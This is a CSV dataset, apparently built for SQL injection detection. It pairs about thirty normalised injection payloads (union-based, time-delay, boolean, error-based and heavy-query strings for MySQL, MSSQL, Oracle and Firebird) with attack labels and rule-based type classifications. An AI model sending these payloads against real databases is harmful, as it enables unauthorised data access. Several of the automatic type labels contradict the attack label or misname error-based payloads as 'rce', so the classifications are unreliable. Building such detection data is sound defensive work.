row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
8340,1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
8341,"1%"" ) ) union all select null,null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8342,"-7007 ) union all select 6704,6704--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8343,1' ) ) as uizu where 1774 = 1774,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8344,"1'|| ( select 'eamo' where 4958 = 4958 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ) ||'",1,,boolean_blind,generic,0.95,4958 = 4958 and detected — boolean_blind injection (priority 8) on generic,rule-based
8345,"1%' ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( '%' = '",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
8346,-2715' ) ) or 6942 = 1636 and ( ( 'mqeq' = 'mqeq,1,,boolean_blind,generic,0.95,6942 = 1636 and detected — boolean_blind injection (priority 8) on generic,rule-based
8347,"-3378%"" ) ) union all select 9357,9357,9357,9357,9357--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8348,"-6263%"" ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""%"" = """,1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
8349,waitfor delay '0:0:5' ) +',1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
8350,"1"" and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""gxhz"" = ""gxhz",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
8351,-4882' order by 1#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8352,1 where 2301 = 2301,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8353,-9005 union all select 4410#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8354,"-7324 ) or make_set ( 8486 = 6544,6544 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8355,1' or sleep ( 5 ) and 'udqz' = 'udqz,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
8356,"1%"" ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ""%"" = """,1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8357,"1"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""qyew"" = ""qyew",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
8358,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) #",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8359,"1"" ) where 3084 = 3084 union all select null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8360,"-4993"" union all select 6959,6959,6959--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8361,"end and ( ( ""dmgj"" = ""dmgj",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8362,"1' ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
8363,1 ) where 8813 = 8813,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8364,1' ) ) and sleep ( 5 ) #,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
8365,( 8266 = 8266 ) *9900,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
8366,"1"" and 7533 = 7533 and ""dqjp"" = ""dqjp",1,,boolean_blind,generic,0.95,7533 = 7533 and detected — boolean_blind injection (priority 8) on generic,rule-based
8367,"1 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) -- sbvl",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8368,select ( case when ( 1227 = 4014 ) then 1227 else 1227* ( select 1227 from mysql.db ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8369,1' ) as dqgr where 2427 = 2427 and ( 3020 = 3020 ) *6703--,1,,boolean_blind,generic,0.95,2427 = 2427 and detected — boolean_blind injection (priority 8) on generic,rule-based
